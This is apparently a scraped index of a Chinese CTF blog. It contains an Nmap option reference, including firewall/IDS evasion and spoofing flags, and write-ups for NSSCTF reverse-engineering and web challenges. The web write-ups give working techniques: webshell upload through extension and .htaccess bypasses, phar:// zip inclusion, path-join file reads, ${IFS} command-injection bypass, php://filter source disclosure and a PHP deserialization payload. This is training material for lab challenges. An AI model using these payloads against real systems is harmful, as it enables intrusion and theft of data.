--osscan-limit 针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口) --osscan-guess 推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配 ","date":"2023-11-17","objectID":"/nmap/:6:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#os-识别"},{"categories":["tools","manual"],"content":"\r防火墙 / IDS 躲避和哄骗 VERILOG-f; --mtu value 指定使用分片、指定数据包的MTU. -D decoy1,decoy2,ME 使用诱饵隐蔽扫描 -S IP-ADDRESS 源地址欺骗 -e interface 使用指定的接口 -g/ --source-port PROTNUM 使用指定源端口 --proxies url1,[url2],... 使用HTTP或者SOCKS4的代理 --data-length NUM 填充随机数据让数据包长度达到NUM --ip-options OPTIONS 使用指定的IP选项来发送数据包 --ttl VALUE 设置IP time-to-live域 --spoof-mac ADDR/PREFIX/VEBDOR MAC地址伪装 --badsum 使用错误的checksum来发送数据包 ","date":"2023-11-17","objectID":"/nmap/:7:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#防火墙--ids-躲避和哄骗"},{"categories":["tools","manual"],"content":"\rNmap 输出 VERILOG-oN 将标准输出直接写入指定的文件 -oX 输出xml文件 -oS 将所有的输出都改为大写 -oG 输出便于通过bash或者perl处理的格式,非xml -oA BASENAME 可将扫描结果以标准格式、XML格式和Grep格式一次性输出 -v 提高输出信息的详细度 -d level 设置debug级别,最高是9 --reason 显示端口处于带确认状态的原因 --open 只输出端口状态为open的端口 --packet-trace 显示所有发送或者接收到的数据包 --iflist 显示路由信息和接口,便于调试 --log-errors 把日志等级为errors/warings的日志输出 --append-output 追加到指定的文件 --resume FILENAME 恢复已停止的扫描 --stylesheet PATH/URL 设置XSL样式表，转换XML输出 --webxml 从namp.org得到XML的样式 --no-sytlesheet 忽略XML声明的XSL样式表 ","date":"2023-11-17","objectID":"/nmap/:8:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#nmap-输出"},{"categories":["tools","manual"],"content":"\r其他 Nmap 选项 VERILOG-6 开启IPv6 -A OS识别,版本探测,脚本扫描和traceroute --datedir DIRNAME 说明用户Nmap数据文件位置 --send-eth / --send-ip 使用原以太网帧发送/在原IP层发送 --privileged 假定用户具有全部权限 --unprovoleged 假定用户不具有全部权限,创建原始套接字需要root权限 -V 打印版本信息 -h 输出帮助 ","date":"2023-11-17","objectID":"/nmap/:9:0","series":null,"tags":["tools","manual"],"title":"Nmap参数","uri":"/nmap/#其他-nmap-选项"},{"categories":["reverse","wp"],"content":"几道reverse基础题目wp ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:0","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]re1很简单，写的c语言脚本 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[1000]; strcpy_s(Str1, sizeof(Str1), \"{34sy_r3v3rs3}\"); int i; for (i = 0; i \u003c= 665; ++i) { if (Str1[i] == '3') Str1[i] = 'e'; } for (i = 0; i \u003c= 665; ++i) { if (Str1[i] == '4') Str1[i] = 'a'; } printf(\"%s\", Str1); } Tips： ​ 1.使用strcpy函数要添加#include \u003cstring.h\u003e函数头 ​ 2.在比较新的编译器里面，会对strcpy的安全问题报错，需对strcpy进行改进： strcpy_s(str1，中间参数，str2); 中间参数的意义可以理解为：str2预计需要向str1占用多少空间 所以很显然中间参数的值的大小，必须大于等于str2的空间，但是小于等于str1空间（前提:str1\u003e=str2） 通常情况下可以写为： strcpy_s(str1，sizeof(str2)，str2); 或者strcpy_s(str1，strlen(str2)+1，str2); ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:1","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛re1"},{"categories":["reverse","wp"],"content":"\r[NSSCTF 2022 Spring Recruit]easy C\r#include \u003cstdio.h\u003e int main() { char a[] = \"d`vxbQd\"; for (int i = 0; i \u003c 7; i++) { a[i] = a[i] ^ 2; a[i]--; } printf(\"%s\",a); } ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:2","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nssctf-2022-spring-recruiteasy-c"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]简简单单的解密把原本的python的脚本稍作修改，再跑一遍(xor加密)得到flag import base64,urllib.parse key = \"HereIsFlagggg\" flag = \"xxxxxxxxxxxxxxxxxxx\" s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) cipher = \"\".join(res) crypt = (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) enc = str(base64.b64decode(crypt),'utf-8') enc = urllib.parse.quote(enc) print(enc) # enc = %C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA 下面是修改之后的脚本： import urllib.parse key = \"HereIsFlagggg\" flag = \"%C2%A6n%C2%87Y%1Ag%3F%C2%A01.%C2%9C%C3%B7%C3%8A%02%C3%80%C2%92W%C3%8C%C3%BA\" flag =urllib.parse.unquote(flag) s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] res = [] i = j = 0 for s in flag: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] res.append(chr(ord(s) ^ k)) cipher = \"\".join(res) print(cipher) //NSSCTF{REAL_EZ_RC4} Tips：python脚本中最下边注释掉的enc就是正确的flag之后加密的，千万不要覆盖掉 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:3","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛简简单单的解密"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]re2反编译，很简单的代码审计，复制改程序的代码进行修改，逆向运算进行解密 下面是C语言写的脚本 #include \u003cstdio.h\u003e int main() { char Str[] = \"ylqq]aycqyp{\"; int v7 = strlen(Str); for (int i = 0; i \u003c v7; ++i) { if ((Str[i] \u003c= 96 || Str[i] \u003e 98) \u0026\u0026 (Str[i] \u003c= 64 || Str[i] \u003e 66)) Str[i] += 2; else Str[i] -= 24; } printf(\"%s\", Str); } 但输出的flag好像有点问题，确实怪 //{nss_c{es{r},{用a替换，得到{nss_caesar}为正确答案 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:4","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛re2"},{"categories":["reverse","wp"],"content":"\r[GFCTF 2021]wordy非预期解：在十六进制数据对应的ASCII中发现了flag ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:5","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#gfctf-2021wordy"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]fakerandom\rappend()函数 ⽤于在列表末尾添加新的对象 random.getrandbits(k) 返回一个不大于K位的Python整数(十进制)，比如k=10，则结果是0~2^10之间的整数。 以下是算法逆向脚本： import random result = [201, 8, 198, 68, 131, 152, 186, 136, 13, 130, 190, 112, 251, 93, 212, 1, 31, 214, 116, 244] random.seed(1) l = [] for i in range(4): l.append(random.getrandbits(8)) flag=[] for i in range(len(l)): random.seed(l[i]) for n in range(5): flag.append(chr(result[i*5+n]^random.getrandbits(8))) print(''.join(flag)) ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:6","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛fakerandom"},{"categories":["reverse","wp"],"content":"\r[NISACTF 2022]string #include \u003cstdio.h\u003e int main() { srand(0x2766); printf(\"NSSCTF{\"); for (int m = 0; m \u003c 13; ++m ) { printf(\"%d\", rand() % 8 + 1); } putchar('}'); } Tips：必须在Linux下运行才正确 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:7","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nisactf-2022string"},{"categories":["reverse","wp"],"content":"\r[NSSRound#3 Team]jump_by_jump非预期解： 预期解： IDA32位，定位到main函数，发现花指令 快捷键D转换成数据 然后nop(90) 随后一路快捷键C将黄色代码转换成数据 整理完成之后，创建函数，之后就可以进行F5反编译，得到flag ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:8","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#nssround3-teamjump_by_jump"},{"categories":["reverse","wp"],"content":"\r[WUSTCTF 2020]level2根据题目标签可知，UPX脱壳，可以用upx直接进行脱壳 upx.exe -d xxxxx.exe https://github.com/upx/upx/releases ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:9","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#wustctf-2020level2"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]fakebase题目代码 flag = 'xxxxxxxxxxxxxxxxxxx' s_box = 'qwertyuiopasdfghjkzxcvb123456#$' tmp = '' for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = '' while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) # s = u#k4ggia61egegzjuqz12jhfspfkay 审计注释： ord(i):返回字符 `i` 的 ASCII 码值。 bin(ord(i)) 将 ASCII 码值转换为二进制数。 str(bin(ord(i))) 将二进制数转换为字符串。 [2:] 从第二个字符开始取，去除字符串开头的 '0b'。 用 0 补齐字符串的左侧，使其总长度为 8。 tmp += str(bin(ord(i)))[2:].zfill(8) 将处理结果拼接到 tmp 中。 int(tmp,2) 将 tmp 解释为二进制数，并转换为整数类型。 本题考察取模逆运算 ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:10","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛fakebase"},{"categories":["reverse","wp"],"content":"\r[HUBUCTF 2022 新生赛]simple_RE\rmemcmp函数的原型为 int memcmp(const void *str1, const void *str2, size_t n);其功能是把存储区 str1 和存储区 str2 的前 n 个字节进行比较。该函数是按字节比较的，位于string.h。 如果返回值 \u003c 0，则表示 str1 小于 str2。 如果返回值 \u003e 0，则表示 str1 大于 str2。 如果返回值 = 0，则表示 str1 等于 str2。 通过Shift+F12查看字符串，发现两段类似base64编码的字符串，猜测base64换表，脚本如下： import base64 str1 = \"5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==\" #str1是要解密的代码 string1 = \"qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD\" #string1是改过之后的base64表 string2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" print (base64.b64decode(str1.translate(str.maketrans(string1,string2)))) ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:11","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#hubuctf-2022-新生赛simple_re"},{"categories":["reverse","wp"],"content":"\r[MoeCTF 2022]Hex\r","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:12","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#moectf-2022hex"},{"categories":["reverse","wp"],"content":"\r[HNCTF 2022 Week1]贝斯是什么乐器啊？\rpython脚本： from base64 import * enc = \"TlJRQFBBdTs4alsrKFI6MjgwNi5p\" str = b64decode(enc).decode() for i in range(len(str)): print(chr(i + ord(str[i])),end='') NSSCTF{B@se64_HAHAHA} ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:13","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#hnctf-2022-week1贝斯是什么乐器啊"},{"categories":["reverse","wp"],"content":"\r[SWPUCTF 2021 新生赛]astJS一个xor加密 使用 npm 包 escodegen 解密 安装 escodegen npm i escodegen -g ​ 2.将json 文件转换成 js语句 $ esgenerate 附件.json (function () { function bE(str, key) { var arr = str.split(''); return arr.map(i =\u003e { return String.fromCharCode(i.charCodeAt() ^ key); }).join(''); } console.log(bE('EXXH_Mpjx\\x7FBxYnjggrM~eerv', 11)); }()); ​ 3.执行语句即可获得 flag $ node Welcome to Node.js v14.13.1. Type \".help\" for more information. \u003e (function () { ... function bE(str, key) { ..... var arr = str.split(''); ..... return arr.map(i =\u003e { ....... return String.fromCharCode(i.charCodeAt() ^ key); ....... }).join(''); ..... } ... console.log(bE('EXXH_Mpjx\\x7FBxYnjggrM~eerv', 11)); ... }()); NSSCTF{astIsReallyFunny} ","date":"2023-11-17","objectID":"/nssctf-reverse-wp/:0:14","series":null,"tags":["reverse","wp"],"title":"NSSCTF-reverse-wp","uri":"/nssctf-reverse-wp/#swpuctf-2021-新生赛astjs"},{"categories":["web"],"content":"几道web基础题目wp ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:0","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyupload2.0\r几个常用的姿势试过了，PHP，Php行不通，最后改成phtml，成功上传 最后蚁剑，成功连接 【复盘】查看upload.php \u003c?php session_start(); echo \" \u003cmeta charset=\\\"utf-8\\\"\u003e\"; if(!isset($_SESSION['user'])){ $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000)); } if(isset($_FILES['uploaded'])) { $target_path = \"./upload\"; $t_path = $target_path . \"/\" . basename($_FILES['uploaded']['name']); $uploaded_name = $_FILES['uploaded']['name']; $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name,'.') + 1); $uploaded_size = $_FILES['uploaded']['size']; $uploaded_tmp = $_FILES['uploaded']['tmp_name']; if(preg_match(\"/php|hta|ini/i\", $uploaded_ext)) { die(\"php是不行滴\"); } else { $content = file_get_contents($uploaded_tmp); move_uploaded_file($uploaded_tmp, $t_path); echo \"{$t_path} succesfully uploaded!\"; } } else { die(\"不传🐎还想要f1ag?\"); } ?\u003e ​ 发现用正则表达过滤了php.hta/ini ​ 同时，php3，php5，pht，phtml，phps都是php可运行的文件扩展名 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:1","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyupload20"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyupload3.0\r看赛题标签，提示了.htaccess，果断png+.htaccess组合 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:2","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyupload30"},{"categories":["web"],"content":"\r[NISACTF 2022]babyuploadF12发现有目录，进行访问后下载得到upload源码，进行代码审计 @app.route('/upload', methods=['POST']) def upload(): if 'file' not in request.files: return redirect('/') file = request.files['file'] if \".\" in file.filename: return \"Bad filename!\", 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(\"insert into files (id, path) values (?, ?)\", (uid, file.filename,)) except sqlite3.IntegrityError: return \"Duplicate file\" conn.commit() file.save('uploads/' + file.filename) return redirect('/file/' + uid) 可知，若上传的文件中包含“.”，则会返回Bad filename!，那我们上传一个没有后缀的文件 @app.route('/upload', methods=['POST']) def upload(): if 'file' not in request.files: return redirect('/') file = request.files['file'] if \".\" in file.filename: return \"Bad filename!\", 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(\"insert into files (id, path) values (?, ?)\", (uid, file.filename,)) except sqlite3.IntegrityError: return \"Duplicate file\" conn.commit() file.save('uploads/' + file.filename) return redirect('/file/' + uid) @app.route('/file/\u003cid\u003e') def file(id): conn = db() cur = conn.cursor() cur.execute(\"select path from files where id=?\", (id,)) res = cur.fetchone() if res is None: return \"File not found\", 404 # print(res[0]) with open(os.path.join(\"uploads/\", res[0]), \"r\") as f: return f.read() 上传后生成一个uuid，并将uuid和文件名存入数据库中，并返回文件的uuid。再通过/file/uuid访问文件，通过查询数据库得到对应文件名，在文件名前拼接uploads/后读取该路径下上传的文件。 绝对路径拼接漏洞 ​ os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。 ​ 然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径 当上传的文件名为 /flag ，上传后通过uuid访问文件后，查询到的文件名是 /flag ，那么进行路径拼接时，uploads/ 将被删除，读取到的就是根目录下的 flag 文件。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:3","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#nisactf-2022babyupload"},{"categories":["web"],"content":"\r[NISACTF 2022]bingdundun~题目提示可以上传压缩包，关于phar://伪协议，ChatGPT给出了这样的 Phar:// 是 PHP 中的一个伪协议，用于访问 Phar （PHP Archive）文件，Phar 是一种类似于 Zip 的文件格式，用于将多个 PHP 文件打包成一个文件，并可以像一个普通的 PHP 文件一样使用。 主要是用于在php中对压缩文件格式的读取。这种方式通常是用来配合文件上传漏洞使用，或者进行进阶的phar反序列化攻击 用法就是把一句话木马压缩成zip格式，shell.php -\u003e shell.zip，然后再上传到服务器（后续通过前端页面上传也没有问题，通常服务器不会限制上传 zip 文件），再访问：?filename=phar://…/shell.zip/shell.php 原文链接：https://blog.csdn.net/YangYubo091699/article/details/127351065 所以，上传a.zip(a.php一句话木马)， 根据首页给的提示，构造payload http://1.14.71.254:28403/?bingdundun=phar://6d3604f6ad66f035685c8e4caa342aea.zip/a 随后在蚁剑连接，并在根目录发现了flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:4","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#nisactf-2022bingdundun"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]jicaophp代码审计 ​ 分析代码可知，需要用get方法传进一个json，以及通过post方法传入一个id ​ 构造数据包如下： ​ 回显得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:5","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛jicao"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easy_md5\r进行代码审计，要求name和password的值不同，同时要求两者的md相同，然而进行判断是用的是\"==“符号，这是php的弱类型比较 法一：可以使用带0e开头的数字串进行参数传递，因为PHP会将0e开头的数字转化为0，故此时md5值相等，二来能够给变量的值不相等。 法二：可以传递数组，如name[]=123，password[]=456，md5不能加密数组，故两个md5返回的都是null ​ （另：若遇到===这样的强类型比较，方法一就失效了，方法二仍然有效，或者还可以使用软件fastcoll进行md5碰撞，生成两个字符串使得他们的md5值相同） ​ 另：0e开头的数字 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 240610708 0e462097431906509019562988736854 314282422 使用bp发包，得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:6","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#image-20230228182602104httpsscofield-1313710994cosap-beijingmyqcloudcomimage-20230228182602104pngswpuctf-2021-新生赛easy_md5"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]Do_you_know_http\r根据页面反馈信息，以及题目描述提示，进行抓包修改user-agent并添加xff，在返回信息中，得到location 访问a.php 再次发包，发现新站点 访问后得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:7","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛do_you_know_http"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]babyrce\r根据题目提示推测，应该跟cookie有关 抓包修改cookie的值，发包后发现新站点： \u003c?php error_reporting(0); highlight_file(__FILE__); error_reporting(0); if (isset($_GET['url'])) { $ip=$_GET['url']; if(preg_match(\"/ /\", $ip)){ die('nonono'); } $a = shell_exec($ip); echo $a; } ?\u003e nonono ​ 从代码层面来看，屏蔽了空格（ ），所以要采取手段来绕过对空格的屏蔽，如果传入的url值不包含空格，则通过函数 **$a = shell_exec($ip);**进行远程rce 在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。 ${IFS} 可使用${IFS}代替空格。 cat${IFS}flag.txt cat$IFS$1flag.txt cat${IFS}$1flag.txt 先查看根目录，发现疑似文件 随后使用tac或cat读取文件，得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:8","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛babyrce"},{"categories":["web"],"content":"\r[第五空间 2021]WebFTP\r​ F12发现用户名为admin，尝试爆破弱口令，可惜没爆破出来，扫描网站后台，发现有.git文件，使用githacker进行扒取，这里复习一下githacker的用法，功能上是比githack要强大的。 ​ 进入到Githacker文件夹执行__init__.py格式如下： ┌──(root㉿kali)-[/home/kali/githacker/GitHacker] └─# python __init__.py --url http://1.14.71.254:28784/.git/ --output-folder result ​ 扒取到的相关文件会输出到该目录下result文件夹中，查看readme.md文档，发现初始账号和密码 ​ 进去之后，好像没啥卵用，phpinfo.php文件在目录var/www/html中，但发现无法在ftp里面直接打开。 ​ 直接访问http://1.14.71.254:28306/.phpinfo.php就可以了 ​ 我觉得倒是做了许多无用功，复盘时返现直接dirsearch返回的结果中除了.git，也包含了README.md文件以及phpinfo.php都可以直接访问，在phpinfo页面搜索flag直接出。 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:9","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#第五空间-2021webftp"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]include​ 进入环境，提示传入一个文件，此外并没有发现什么有效信息，dirsearch扫描后台目录，也没啥有效信息，尝试php伪协议 ​ 构造payload进行get传参：http://1.14.71.254:28956/?file=flag 发现有include_once函数 include_once()：在脚本执行期间包含并运行指定文件。该函数和include 函数类似，两者唯一的区别是 使用该函数的时候，php会加检查指定文件是否已经被包含过，如果是，则不会再被包含。 于是利用伪协议构造，得到经过base64编码的flag http://1.14.71.254:28956/?file=php://filter/convert.base64-encode/resource=flag.php 至于为什么要使用base64进行编码输出 常见的php伪协议 1）file:// 访问本地文件系统 2）http:// 访问HTTP(S)网址 3）ftp:// 访问FTP(S)URL 4)php:// 访问各个输出输入流 5)zlib:// 处理压缩流 6)data:// 读取数据 7)glob:// 查找匹配的文件路径模式 8)phar:// PHP归档 9)rar:// RAR数据压缩 至于为什么要使用base64编码，ChatGPT给出了这样的回答： 为了将目标文件内容以文本形式传输给攻击者，攻击者通常会将目标文件内容进行编码，例如使用Base64编码。这是因为HTTP协议只能传输文本数据，对于二进制数据，如图片、音频和视频等，需要进行编码才能在HTTP请求和响应中传输。 在这种情况下，攻击者可以将目标文件内容进行Base64编码，然后将编码后的结果作为HTTP请求或响应的一部分，从而实现传输。在接收到响应后，攻击者可以将编码后的结果解码，从而获得原始的二进制数据，即目标文件的内容。 (我们读取的是flag.php，而并非.txt文件) 引用一下头秃的bug师傅在CSDN的笔记： 过滤器的分类（及常见过滤器）： string filter(字符过滤器) string.rot13 (对字符串执行 ROT13 转换) 例：php://filter/string.rot13/resource=flag.php string.toupper (转大写) 例：php://filter/string.toupper/resource=flag.php string.tolower (转小写) string.strip_tags (去除 HTML 和 PHP 标记，尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果) 例：php://filter/string.strip_tags/resource=flag.php conversion filter (转换过滤器) convert.base64-encode \u0026 convert.base64-decode (base64加密 base64解密) 例：php://filter/convert.base64-encode/resource=flag.php convert.quoted-printable-encode \u0026 convert.quoted-printable-decode(在字符串后加=0A,及恢复) compression filter(压缩过滤) zlib.deflate \u0026 zlib.inflate(压缩 解压) 例：php://filter/zlib.deflate/resource=flag.php php://filter/zlib.inflate/resource=flag.php bzip2.compress \u0026 bzip2.decompress(zip 压缩 解压) encryption filter(加密过滤器) 摘自：https://blog.csdn.net/L2329794714/article/details/121288668 ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:10","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛include"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]easyrce灰常简单的rce， 在phpinfo中未发现flag，随后构造： http://1.14.71.254:28678/?url=system(\"ls /); http://1.14.71.254:28678/?url=system(%22tac%20/flllllaaaaaaggggggg%22); 得到flag ","date":"2023-11-17","objectID":"/nssctf-web-wp/:0:11","series":null,"tags":["web"],"title":"NSSCTF-web-wp","uri":"/nssctf-web-wp/#swpuctf-2021-新生赛easyrce"},{"categories":["web"],"content":"\r[SWPUCTF 2021 新生赛]ez_unserialize\r没啥有效信息，扫描一下后台，发现 进入c145s.php，得到源代码 经典php反序列化，ChatGPT讲的很明确了 禁用错误报告。error_reporting(0); 可以禁用 PHP 的错误报告，以确保攻击者无法通过错误信息来了解代码的运行情况。 显示 cl45s.php 的源代码。show_source(\"cl45s.php\"); 用于将 cl45s.php 的源代码显示在页面上，这可以帮助攻击者更好地了解代码的运行情况和漏洞点。 定义 wllm 类。这个类具有两个公共属性 $admin 和 $passwd，分别用于存储用户名和密码。类中定义了两个方法，一个是构造函数 __construct()，用于初始化 $admin 和 $passwd 的值；另一个是析构函数 __destruct()，当对象被销毁时执行。 处理传入的参数。$p = $_GET['p']; 用于获取 URL 参数中名为 p 的值。 反序列化。unserialize($p); 将传入的参数 $p 进行反序列化处理，即将字符串转换为 PHP 对象。 调用析构函数。由于在反序列化时会调用对象的构造函数，因此在对象被销毁时会自动调用析构函数 __destruct()。在析构函数中，如果 $admin 的值为 \"admin\"，$passwd 的值为 \"ctf\"，则会包含一个名为 flag.php 的文件，并将其中的 $flag 变量输出到页面上。否则，会将 $admin 和 $passwd 的值输出到页面上，并输出一条提示信息。 传入以下参数得到flag http://1.14.71.254:28814/cl45s.php?p=O:4:%22wllm%22:2:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;} [复习php反序列化] 什么是反序列化漏洞当程序在进行反序列化时，会自动调用一些函数，例如__wakeup(),__destruct()等函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞。 PHP魔术方法魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。 以下是一些常见的php魔术方法： 1、__get、__set 这两个方法是为在类和他们的父类中没有声明的属性而设计的 __get( $property ) 当调用一个未定义的属性时访问此方法 __set( $property, $value ) 给一个未定义的属性赋值时调用 这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 2、__isset、__unset __isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法 __unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法 与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性） 3、__call __call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法 4、__autoload __autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 注意: 在 __autoload 函数中抛出的异常不能被 